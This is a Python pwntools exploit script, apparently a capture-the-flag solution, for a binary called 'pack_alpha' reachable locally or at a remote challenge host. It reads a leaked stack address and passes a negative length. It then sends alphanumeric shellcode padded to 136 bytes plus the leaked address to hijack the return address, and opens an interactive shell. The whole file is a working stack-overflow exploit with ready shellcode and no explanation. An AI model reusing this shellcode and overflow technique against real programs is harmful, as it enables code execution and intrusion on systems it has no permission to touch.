import pwn
pwn.context.terminal = ['tmux', 'splitw', '-h']
elf = pwn.ELF("pack_alpha_d8632741-6be4-4b00-9344-10b218803fb8.pack_alpha")
if pwn.args.GDB:
    io = pwn.gdb.debug(
        "./pack_alpha_d8632741-6be4-4b00-9344-10b218803fb8.pack_alpha", gdbscript='c\n')
elif pwn.args.REMOTE:
    io = pwn.remote("gc1.eng.run", 31160)
else:
    io = elf.process()
io.sendlineafter(b": ", b"Esharky")
io.sendlineafter(b": ", b"19")
io.recvuntil(b": ")
stack_leak = io.recvline(keepends=False)
print(hex(int(stack_leak, 16)))
stack_leak = int(stack_leak, 16)
io.sendlineafter(b": ", b"-1")
shellcode_addr = stack_leak + 0x80 + 0x8 + 0x8
# payload = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
# shellcode = pwn.asm('''
# pop %rax
# ''', arch='amd64', os='linux')
shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
print(pwn.hexdump(shellcode))
payload = shellcode
payload += (136-len(payload))*b'A'
payload += pwn.p64(stack_leak)
io.sendafter(b": ", payload)
print(io.recv())
io.interactive()
